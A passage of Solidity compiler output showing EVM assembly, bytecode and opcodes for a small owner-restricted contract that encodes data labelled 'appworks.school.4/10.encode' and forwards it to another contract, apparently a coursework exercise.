\"#utility.yul\":4200:4203   */\n      dup3\n        /* \"#utility.yul\":4196:4210   */\n      add\n        /* \"#utility.yul\":4181:4210   */\n      swap1\n      pop\n        /* \"#utility.yul\":4047:4216   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4222:4395   */\n    tag_48:\n        /* \"#utility.yul\":4362:4387   */\n      0x736f7272792c20796f75277265206e6f74206f776e6572000000000000000000\n        /* \"#utility.yul\":4358:4359   */\n      0x00\n        /* \"#utility.yul\":4350:4356   */\n      dup3\n        /* \"#utility.yul\":4346:4360   */\n      add\n        /* \"#utility.yul\":4339:4388   */\n      mstore\n        /* \"#utility.yul\":4222:4395   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4401:4767   */\n    tag_49:\n        /* \"#utility.yul\":4543:4546   */\n      0x00\n        /* \"#utility.yul\":4564:4631   */\n      tag_113\n        /* \"#utility.yul\":4628:4630   */\n      0x17\n        /* \"#utility.yul\":4623:4626   */\n      dup4\n        /* \"#utility.yul\":4564:4631   */\n      tag_47\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":4557:4631   */\n      swap2\n      pop\n        /* \"#utility.yul\":4640:4733   */\n      tag_114\n        /* \"#utility.yul\":4729:4732   */\n      dup3\n        /* \"#utility.yul\":4640:4733   */\n      tag_48\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":4758:4760   */\n      0x20\n        /* \"#utility.yul\":4753:4756   */\n      dup3\n        /* \"#utility.yul\":4749:4761   */\n      add\n        /* \"#utility.yul\":4742:4761   */\n      swap1\n      pop\n        /* \"#utility.yul\":4401:4767   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4773:5192   */\n    tag_16:\n        /* \"#utility.yul\":4939:4943   */\n      0x00\n        /* \"#utility.yul\":4977:4979   */\n      0x20\n        /* \"#utility.yul\":4966:4975   */\n      dup3\n        /* \"#utility.yul\":4962:4980   */\n      add\n        /* \"#utility.yul\":4954:4980   */\n      swap1\n      pop\n        /* \"#utility.yul\":5026:5035   */\n      dup2\n        /* \"#utility.yul\":5020:5024   */\n      dup2\n        /* \"#utility.yul\":5016:5036   */\n      sub\n        /* \"#utility.yul\":5012:5013   */\n      0x00\n        /* \"#utility.yul\":5001:5010   */\n      dup4\n        /* \"#utility.yul\":4997:5014   */\n      add\n        /* \"#utility.yul\":4990:5037   */\n      mstore\n        /* \"#utility.yul\":5054:5185   */\n      tag_116\n        /* \"#utility.yul\":5180:5184   */\n      dup2\n        /* \"#utility.yul\":5054:5185   */\n      tag_49\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":5046:5185   */\n      swap1\n      pop\n        /* \"#utility.yul\":4773:5192   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5198:5296   */\n    tag_50:\n        /* \"#utility.yul\":5249:5255   */\n      0x00\n        /* \"#utility.yul\":5283:5288   */\n      dup2\n        /* \"#utility.yul\":5277:5289   */\n      mload\n        /* \"#utility.yul\":5267:5289   */\n      swap1\n      pop\n        /* \"#utility.yul\":5198:5296   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5302:5470   */\n    tag_51:\n        /* \"#utility.yul\":5385:5396   */\n      0x00\n        /* \"#utility.yul\":5419:5425   */\n      dup3\n        /* \"#utility.yul\":5414:5417   */\n      dup3\n        /* \"#utility.yul\":5407:5426   */\n      mstore\n        /* \"#utility.yul\":5459:5463   */\n      0x20\n        /* \"#utility.yul\":5454:5457   */\n      dup3\n        /* \"#utility.yul\":5450:5464   */\n      add\n        /* \"#utility.yul\":5435:5464   */\n      swap1\n      pop\n        /* \"#utility.yul\":5302:5470   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5476:5722   */\n    tag_52:\n        /* \"#utility.yul\":5557:5558   */\n      0x00\n        /* \"#utility.yul\":5567:5680   */\n    tag_120:\n        /* \"#utility.yul\":5581:5587   */\n      dup4\n        /* \"#utility.yul\":5578:5579   */\n      dup2\n        /* \"#utility.yul\":5575:5588   */\n      lt\n        /* \"#utility.yul\":5567:5680   */\n      iszero\n      tag_122\n      jumpi\n        /* \"#utility.yul\":5666:5667   */\n      dup1\n        /* \"#utility.yul\":5661:5664   */\n      dup3\n        /* \"#utility.yul\":5657:5668   */\n      add\n        /* \"#utility.yul\":5651:5669   */\n      mload\n        /* \"#utility.yul\":5647:5648   */\n      dup2\n        /* \"#utility.yul\":5642:5645   */\n      dup5\n        /* \"#utility.yul\":5638:5649   */\n      add\n        /* \"#utility.yul\":5631:5670   */\n      mstore\n        /* \"#utility.yul\":5603:5605   */\n      0x20\n        /* \"#utility.yul\":5600:5601   */\n      dup2\n        /* \"#utility.yul\":5596:5606   */\n      add\n        /* \"#utility.yul\":5591:5606   */\n      swap1\n      pop\n        /* \"#utility.yul\":5567:5680   */\n      jump(tag_120)\n    tag_122:\n        /* \"#utility.yul\":5714:5715   */\n      0x00\n        /* \"#utility.yul\":5705:5711   */\n      dup5\n        /* \"#utility.yul\":5700:5703   */\n      dup5\n        /* \"#utility.yul\":5696:5712   */\n      add\n        /* \"#utility.yul\":5689:5716   */\n      mstore\n        /* \"#utility.yul\":5538:5722   */\n      pop\n        /* \"#utility.yul\":5476:5722   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5728:6101   */\n    tag_53:\n        /* \"#utility.yul\":5814:5817   */\n      0x00\n        /* \"#utility.yul\":5842:5880   */\n      tag_124\n        /* \"#utility.yul\":5874:5879   */\n      dup3\n        /* \"#utility.yul\":5842:5880   */\n      tag_50\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":5896:5966   */\n      tag_125\n        /* \"#utility.yul\":5959:5965   */\n      dup2\n        /* \"#utility.yul\":5954:5957   */\n      dup6\n        /* \"#utility.yul\":5896:5966   */\n      tag_51\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":5889:5966   */\n      swap4\n      pop\n        /* \"#utility.yul\":5975:6040   */\n      tag_126\n        /* \"#utility.yul\":6033:6039   */\n      dup2\n        /* \"#utility.yul\":6028:6031   */\n      dup6\n        /* \"#utility.yul\":6021:6025   */\n      0x20\n        /* \"#utility.yul\":6014:6019   */\n      dup7\n        /* \"#utility.yul\":6010:6026   */\n      add\n        /* \"#utility.yul\":5975:6040   */\n      tag_52\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":6065:6094   */\n      tag_127\n        /* \"#utility.yul\":6087:6093   */\n      dup2\n        /* \"#utility.yul\":6065:6094   */\n      tag_35\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":6060:6063   */\n      dup5\n        /* \"#utility.yul\":6056:6095   */\n      add\n        /* \"#utility.yul\":6049:6095   */\n      swap2\n      pop\n        /* \"#utility.yul\":5818:6101   */\n      pop\n        /* \"#utility.yul\":5728:6101   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6107:6416   */\n    tag_19:\n        /* \"#utility.yul\":6218:6222   */\n      0x00\n        /* \"#utility.yul\":6256:6258   */\n      0x20\n        /* \"#utility.yul\":6245:6254   */\n      dup3\n        /* \"#utility.yul\":6241:6259   */\n      add\n        /* \"#utility.yul\":6233:6259   */\n      swap1\n      pop\n        /* \"#utility.yul\":6305:6314   */\n      dup2\n        /* \"#utility.yul\":6299:6303   */\n      dup2\n        /* \"#utility.yul\":6295:6315   */\n      sub\n        /* \"#utility.yul\":6291:6292   */\n      0x00\n        /* \"#utility.yul\":6280:6289   */\n      dup4\n        /* \"#utility.yul\":6276:6293   */\n      add\n        /* \"#utility.yul\":6269:6316   */\n      mstore\n        /* \"#utility.yul\":6333:6409   */\n      tag_129\n        /* \"#utility.yul\":6404:6408   */\n      dup2\n        /* \"#utility.yul\":6395:6401   */\n      dup5\n        /* \"#utility.yul\":6333:6409   */\n      tag_53\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":6325:6409   */\n      swap1\n      pop\n        /* \"#utility.yul\":6107:6416   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6422:6540   */\n    tag_54:\n        /* \"#utility.yul\":6509:6533   */\n      tag_131\n        /* \"#utility.yul\":6527:6532   */\n      dup2\n        /* \"#utility.yul\":6509:6533   */\n      tag_44\n      jump\t// in\n    tag_131:\n        /* \"#utility.yul\":6504:6507   */\n      dup3\n        /* \"#utility.yul\":6497:6534   */\n      mstore\n        /* \"#utility.yul\":6422:6540   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6546:6654   */\n    tag_55:\n        /* \"#utility.yul\":6623:6647   */\n      tag_133\n        /* \"#utility.yul\":6641:6646   */\n      dup2\n        /* \"#utility.yul\":6623:6647   */\n      tag_44\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":6618:6621   */\n      dup3\n        /* \"#utility.yul\":6611:6648   */\n      mstore\n        /* \"#utility.yul\":6546:6654   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6660:6737   */\n    tag_56:\n        /* \"#utility.yul\":6697:6704   */\n      0x00\n        /* \"#utility.yul\":6726:6731   */\n      dup2\n        /* \"#utility.yul\":6715:6731   */\n      swap1\n      pop\n        /* \"#utility.yul\":6660:6737   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6743:6851   */\n    tag_57:\n        /* \"#utility.yul\":6820:6844   */\n      tag_136\n        /* \"#utility.yul\":6838:6843   */\n      dup2\n        /* \"#utility.yul\":6820:6844   */\n      tag_56\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":6815:6818   */\n      dup3\n        /* \"#utility.yul\":6808:6845   */\n      mstore\n        /* \"#utility.yul\":6743:6851   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6931:7440   */\n    tag_58:\n        /* \"#utility.yul\":7074:7078   */\n      0x40\n        /* \"#utility.yul\":7069:7072   */\n      dup3\n        /* \"#utility.yul\":7065:7079   */\n      add\n        /* \"#utility.yul\":7165:7169   */\n      0x00\n        /* \"#utility.yul\":7158:7163   */\n      dup3\n        /* \"#utility.yul\":7154:7170   */\n      add\n        /* \"#utility.yul\":7148:7171   */\n      mload\n        /* \"#utility.yul\":7184:7247   */\n      tag_138\n        /* \"#utility.yul\":7241:7245   */\n      0x00\n        /* \"#utility.yul\":7236:7239   */\n      dup6\n        /* \"#utility.yul\":7232:7246   */\n      add\n        /* \"#utility.yul\":7218:7230   */\n      dup3\n        /* \"#utility.yul\":7184:7247   */\n      tag_55\n      jump\t// in\n    tag_138:\n        /* \"#utility.yul\":7089:7257   */\n      pop\n        /* \"#utility.yul\":7341:7345   */\n      0x20\n        /* \"#utility.yul\":7334:7339   */\n      dup3\n        /* \"#utility.yul\":7330:7346   */\n      add\n        /* \"#utility.yul\":7324:7347   */\n      mload\n        /* \"#utility.yul\":7360:7423   */\n      tag_139\n        /* \"#utility.yul\":7417:7421   */\n      0x20\n        /* \"#utility.yul\":7412:7415   */\n      dup6\n        /* \"#utility.yul\":7408:7422   */\n      add\n        /* \"#utility.yul\":7394:7406   */\n      dup3\n        /* \"#utility.yul\":7360:7423   */\n      tag_57\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":7267:7433   */\n      pop\n        /* \"#utility.yul\":7043:7440   */\n      pop\n        /* \"#utility.yul\":6931:7440   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7446:7523   */\n    tag_59:\n        /* \"#utility.yul\":7483:7490   */\n      0x00\n        /* \"#utility.yul\":7512:7517   */\n      dup2\n        /* \"#utility.yul\":7501:7517   */\n      swap1\n      pop\n        /* \"#utility.yul\":7446:7523   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7529:7647   */\n    tag_60:\n        /* \"#utility.yul\":7616:7640   */\n      tag_142\n        /* \"#utility.yul\":7634:7639   */\n      dup2\n        /* \"#utility.yul\":7616:7640   */\n      tag_59\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":7611:7614   */\n      dup3\n        /* \"#utility.yul\":7604:7641   */\n      mstore\n        /* \"#utility.yul\":7529:7647   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7653:8188   */\n    tag_28:\n        /* \"#utility.yul\":7848:7852   */\n      0x00\n        /* \"#utility.yul\":7886:7889   */\n      0x80\n        /* \"#utility.yul\":7875:7884   */\n      dup3\n        /* \"#utility.yul\":7871:7890   */\n      add\n        /* \"#utility.yul\":7863:7890   */\n      swap1\n      pop\n        /* \"#utility.yul\":7900:7971   */\n      tag_144\n        /* \"#utility.yul\":7968:7969   */\n      0x00\n        /* \"#utility.yul\":7957:7966   */\n      dup4\n        /* \"#utility.yul\":7953:7970   */\n      add\n        /* \"#utility.yul\":7944:7950   */\n      dup7\n        /* \"#utility.yul\":7900:7971   */\n      tag_54\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":7981:8099   */\n      tag_145\n        /* \"#utility.yul\":8095:8097   */\n      0x20\n        /* \"#utility.yul\":8084:8093   */\n      dup4\n        /* \"#utility.yul\":8080:8098   */\n      add\n        /* \"#utility.yul\":8071:8077   */\n      dup6\n        /* \"#utility.yul\":7981:8099   */\n      tag_58\n      jump\t// in\n    tag_145:\n        /* \"#utility.yul\":8109:8181   */\n      tag_146\n        /* \"#utility.yul\":8177:8179   */\n      0x60\n        /* \"#utility.yul\":8166:8175   */\n      dup4\n        /* \"#utility.yul\":8162:8180   */\n      add\n        /* \"#utility.yul\":8153:8159   */\n      dup5\n        /* \"#utility.yul\":8109:8181   */\n      tag_60\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":7653:8188   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220fa03a37496af64d5a8be49e7c6032ffbfd001d2b0f943199f3d0e83268746ea964736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a060405234801561001057600080fd5b5060405161085f38038061085f8339818101604052810190610032919061010f565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503373ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b60805161070261015d600039600081816075015261019101526107026000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063155332f31461003b578063251b785014610057575b600080fd5b61005560048036038101906100509190610411565b610073565b005b610071600480360381019061006c91906104b8565b61018f565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610101576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100f890610555565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cbec4896826040518263ffffffff1660e01b815260040161015a91906105f4565b600060405180830381600087803b15801561017457600080fd5b505af1158015610188573d6000803e3d6000fd5b5050505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461021d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161021490610555565b60405180910390fd5b60006703782dace9d90000905060007f617070776f726b732e7363686f6f6c2e342f31302e656e636f646500000000009050600060405180604001604052808573ffffffffffffffffffffffffffffffffffffffff168152602001848152509050600085828460405160200161029593929190610695565b60405160208183030381529060405290506102af81610073565b505050505050565b6000604051905090565b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61031e826102d5565b810181811067ffffffffffffffff8211171561033d5761033c6102e6565b5b80604052505050565b60006103506102b7565b905061035c8282610315565b919050565b600067ffffffffffffffff82111561037c5761037b6102e6565b5b610385826102d5565b9050602081019050919050565b82818337600083830152505050565b60006103b46103af84610361565b610346565b9050828152602081018484840111156103d0576103cf6102d0565b5b6103db848285610392565b509392505050565b600082601f8301126103f8576103f76102cb565b5b81356104088482602086016103a1565b91505092915050565b600060208284031215610427576104266102c1565b5b600082013567ffffffffffffffff811115610445576104446102c6565b5b610451848285016103e3565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104858261045a565b9050919050565b6104958161047a565b81146104a057600080fd5b50565b6000813590506104b28161048c565b92915050565b600080604083850312156104cf576104ce6102c1565b5b60006104dd858286016104a3565b92505060206104ee858286016104a3565b9150509250929050565b600082825260208201905092915050565b7f736f7272792c20796f75277265206e6f74206f776e6572000000000000000000600082015250565b600061053f6017836104f8565b915061054a82610509565b602082019050919050565b6000602082019050818103600083015261056e81610532565b9050919050565b600081519050919050565b600082825260208201905092915050565b60005b838110156105af578082015181840152602081019050610594565b60008484015250505050565b60006105c682610575565b6105d08185610580565b93506105e0818560208601610591565b6105e9816102d5565b840191505092915050565b6000602082019050818103600083015261060e81846105bb565b905092915050565b61061f8161047a565b82525050565b61062e8161047a565b82525050565b6000819050919050565b61064781610634565b82525050565b6040820160008201516106636000850182610625565b506020820151610676602085018261063e565b50505050565b6000819050919050565b61068f8161067c565b82525050565b60006080820190506106aa6000830186610616565b6106b7602083018561064d565b6106c46060830184610686565b94935050505056fea2646970667358221220fa03a37496af64d5a8be49e7c6032ffbfd001d2b0f943199f3d0e83268746ea964736f6c63430008120033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x85F CODESIZE SUB DUP1 PUSH2 0x85F DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x10F JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0x13C JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDC DUP3 PUSH2 0xB1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xEC DUP2 PUSH2 0xD1 JUMP JUMPDEST DUP2 EQ PUSH2 0xF7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x109 DUP2 PUSH2 0xE3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x125 JUMPI PUSH2 0x124 PUSH2 0xAC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x133 DUP5 DUP3 DUP6 ADD PUSH2 0xFA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x702 PUSH2 0x15D PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH1 0x75 ADD MSTORE PUSH2 0x191 ADD MSTORE PUSH2 0x702 PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x155332F3 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x251B7850 EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x411 JUMP JUMPDEST PUSH2 0x73 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x71 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6C SWAP2 SWAP1 PUSH2 0x4B8 JUMP JUMPDEST PUSH2 0x18F JUMP JUMPDEST STOP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x101 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF8 SWAP1 PUSH2 0x555 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBEC4896 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x15A SWAP2 SWAP1 PUSH2 0x5F4 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x174 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x188 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x21D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x214 SWAP1 PUSH2 0x555 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH8 0x3782DACE9D90000 SWAP1 POP PUSH1 0x0 PUSH32 0x617070776F726B732E7363686F6F6C2E342F31302E656E636F64650000000000 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE POP SWAP1 POP PUSH1 0x0 DUP6 DUP3 DUP5 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x295 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x695 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 POP PUSH2 0x2AF DUP2 PUSH2 0x73 JUMP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x31E DUP3 PUSH2 0x2D5 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x33D JUMPI PUSH2 0x33C PUSH2 0x2E6 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x350 PUSH2 0x2B7 JUMP JUMPDEST SWAP1 POP PUSH2 0x35C DUP3 DUP3 PUSH2 0x315 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x37C JUMPI PUSH2 0x37B PUSH2 0x2E6 JUMP JUMPDEST JUMPDEST PUSH2 0x385 DUP3 PUSH2 0x2D5 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B4 PUSH2 0x3AF DUP5 PUSH2 0x361 JUMP JUMPDEST PUSH2 0x346 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x3D0 JUMPI PUSH2 0x3CF PUSH2 0x2D0 JUMP JUMPDEST JUMPDEST PUSH2 0x3DB DUP5 DUP3 DUP6 PUSH2 0x392 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x3F8 JUMPI PUSH2 0x3F7 PUSH2 0x2CB JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x408 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x3A1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x427 JUMPI PUSH2 0x426 PUSH2 0x2C1 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP3 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x445 JUMPI PUSH2 0x444 PUSH2 0x2C6 JUMP JUMPDEST JUMPDEST PUSH2 0x451 DUP5 DUP3 DUP6 ADD PUSH2 0x3E3 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x485 DUP3 PUSH2 0x45A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x495 DUP2 PUSH2 0x47A JUMP JUMPDEST DUP2 EQ PUSH2 0x4A0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x4B2 DUP2 PUSH2 0x48C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x4CF JUMPI PUSH2 0x4CE PUSH2 0x2C1 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x4DD DUP6 DUP3 DUP7 ADD PUSH2 0x4A3 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x4EE DUP6 DUP3 DUP7 ADD PUSH2 0x4A3 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x736F7272792C20796F75277265206E6F74206F776E6572000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x53F PUSH1 0x17 DUP4 PUSH2 0x4F8 JUMP JUMPDEST SWAP2 POP PUSH2 0x54A DUP3 PUSH2 0x509 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP 